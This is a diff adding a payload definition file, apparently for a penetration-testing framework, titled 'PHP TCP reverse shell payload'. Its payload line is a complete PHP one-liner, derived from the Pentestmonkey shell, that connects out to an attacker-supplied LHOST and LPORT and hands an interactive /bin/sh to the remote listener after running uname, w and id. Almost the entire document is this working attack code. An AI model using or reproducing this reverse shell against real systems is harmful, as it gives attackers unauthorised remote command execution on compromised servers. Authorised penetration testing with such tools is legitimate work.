@@ -1,0 +1,6 @@
+title=PHP TCP reverse shell payload
+info=big oneliner based in Pentest monkeys reverse shell
+required_opts=LHOST;LPORT
+connector=reverse_tcp_netcat
+payload=/usr/bin/env php -r 'set_time_limit (0);$ip = "LHOST";$port = LPORT;$ch_si = 1400;$w_a = null;$e_a = null;$sh = "uname -a; w; id; /bin/sh -i";chdir("/");umask(0);$s = fsockopen($ip, $port, $errno, $errstr, 30);$dspc = array(0 => array("pipe", "r"),1 => array("pipe", "w"),2 => array("pipe", "w"));$ps = proc_open($sh, $dspc, $pipes);stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($s, 0);while (1) {$read_a = array($s, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $w_a, $e_a, null);if (in_array($s, $read_a)) { $input = fread($s, $ch_si);fwrite($pipes[0], $input);} if (in_array($pipes[1], $read_a)) { $input = fread($pipes[1], $ch_si);fwrite($s, $input);} if (in_array($pipes[2], $read_a)) { $input = fread($pipes[2], $ch_si); fwrite($s, $input);}}fclose($s);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($ps);'
+
